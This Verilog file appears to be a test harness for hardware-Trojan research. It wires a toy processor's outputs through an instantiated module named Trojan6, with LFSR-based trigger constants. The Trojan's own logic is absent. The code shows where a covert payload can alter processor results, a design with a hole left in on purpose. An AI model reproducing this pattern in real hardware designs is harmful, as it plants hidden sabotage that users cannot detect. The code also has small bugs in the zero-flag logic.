// Processor Host Circuit for Trojan6
module trojan6_processor0_host #(
    parameter [127:0] LFSR_INIT = 128'hDEADBEEF12345678ABCDEF0987654321,
    parameter [31:0] TROJ_TRIGGER_STATE_1 = 32'h00000000,
    parameter [31:0] TROJ_TRIGGER_STATE_2 = 32'h354A7B6C,
    parameter [31:0] TROJ_TRIGGER_STATE_3 = 32'hEAAAD8FF,
    parameter [31:0] TROJ_TRIGGER_STATE_4 = 32'h0AAA5C5C,
    parameter [1:0] TROJ_PAYLOAD_BITS = 2'b11
)(
    input wire clk,
    input wire rst,
    input wire [31:0] instruction,
    input wire instr_valid,
    output reg [31:0] result,
    output reg zero_flag,
    output reg proc_ready,
    output reg [31:0] program_counter
);

    // Trojan interface (fixed width)
    wire [31:0] trojan_m0_data_o;
    wire [31:0] trojan_i_s15_data_o;
    wire [31:0] trojan_i_s15_data_o_TrojanPayload;
    
    // Processor state - fixed constants
    reg [31:0] registers [0:15];     // Configurable register count
    reg [127:0] lfsr;
    reg [3:0] proc_state;
    reg [31:0] alu_result;
    
    // Loop variable
    integer i;
    
    // Generate lfsr for trojan conditional trigger
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            lfsr <= LFSR_INIT;
            program_counter <= 32'h0;
        end else if (instr_valid) begin
            lfsr <= {lfsr[126:0], lfsr[127] ^ lfsr[6] ^ lfsr[1] ^ lfsr[0]};
            program_counter <= program_counter + 4;
        end
    end
    
    assign trojan_m0_data_o = lfsr[31:0];
    assign trojan_i_s15_data_o = alu_result;
    
    // Processor logic
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            result <= 32'h0;
            zero_flag <= 1'b0;
            proc_ready <= 1'b0;
            proc_state <= 4'h0;
            alu_result <= 32'h0;
            // Initialize registers
            for (i = 0; i < 16; i = i + 1) begin
                registers[i] <= 32'h0;
            end
        end else begin
            case (proc_state)
                4'h0: begin // IDLE
                    if (instr_valid) begin
                        proc_ready <= 1'b0;
                        proc_state <= 4'h1;
                    end
                end
                4'h1: begin // DECODE
                    case (instruction[31:26]) // Extract opcode
                        6'b000001: proc_state <= 4'h2; // ADD
                        6'b000010: proc_state <= 4'h3; // SUB
                        6'b000011: proc_state <= 4'h4; // AND
                        6'b000100: proc_state <= 4'h5; // OR
                        6'b000101: proc_state <= 4'h6; // XOR
                        6'b000110: proc_state <= 4'h7; // LOAD
                        6'b000111: proc_state <= 4'h8; // STORE
                        default: proc_state <= 4'h9;   // NOP
                    endcase
                end
                4'h2: begin // ADD
                    alu_result <= registers[instruction[25:22]] + registers[instruction[21:18]];
                    zero_flag[0] <= (alu_result == 32'h0); // Zero flag
                    proc_state <= 4'hF;
                end
                4'h3: begin // SUB
                    alu_result <= registers[instruction[25:22]] - registers[instruction[21:18]];
                    zero_flag <= (alu_result == 32'h0);
                    proc_state <= 4'hF;
                end
                4'h4: begin // AND
                    alu_result <= registers[instruction[25:22]] & registers[instruction[21:18]];
                    zero_flag <= (alu_result == 32'h0);
                    proc_state <= 4'hF;
                end
                4'h5: begin // OR
                    alu_result <= registers[instruction[25:22]] | registers[instruction[21:18]];
                    zero_flag <= (alu_result == 32'h0);
                    proc_state <= 4'hF;
                end
                4'h6: begin // XOR
                    alu_result <= registers[instruction[25:22]] ^ registers[instruction[21:18]];
                    zero_flag <= (alu_result == 32'h0);
                    proc_state <= 4'hF;
                end
                4'h7: begin // LOAD
                    alu_result <= {{14{1'b0}}, instruction[17:0]}; // Immediate value
                    registers[instruction[25:22]] <= {{14{1'b0}}, instruction[17:0]};
                    proc_state <= 4'hF;
                end
                4'h8: begin // STORE
                    alu_result <= registers[instruction[25:22]];
                    proc_state <= 4'hF;
                end
                4'h9: begin // NOP
                    alu_result <= 32'h0;
                    proc_state <= 4'hF;
                end
                4'hF: begin // DONE
                    result <= trojan_i_s15_data_o_TrojanPayload;
                    proc_ready <= 1'b1;
                    proc_state <= 4'h0;
                end
                default: proc_state <= 4'h0;
            endcase
        end
    end
    
    // Instantiate Trojan6
    Trojan6 #(
        .TRIGGER_STATE_1(TROJ_TRIGGER_STATE_1),
        .TRIGGER_STATE_2(TROJ_TRIGGER_STATE_2),
        .TRIGGER_STATE_3(TROJ_TRIGGER_STATE_3),
        .TRIGGER_STATE_4(TROJ_TRIGGER_STATE_4),
        .PAYLOAD_BITS(TROJ_PAYLOAD_BITS)
    ) trojan_inst (
        .m0_data_o(trojan_m0_data_o),
        .i_s15_data_o(trojan_i_s15_data_o),
        .i_s15_data_o_TrojanPayload(trojan_i_s15_data_o_TrojanPayload)
    );

endmodule

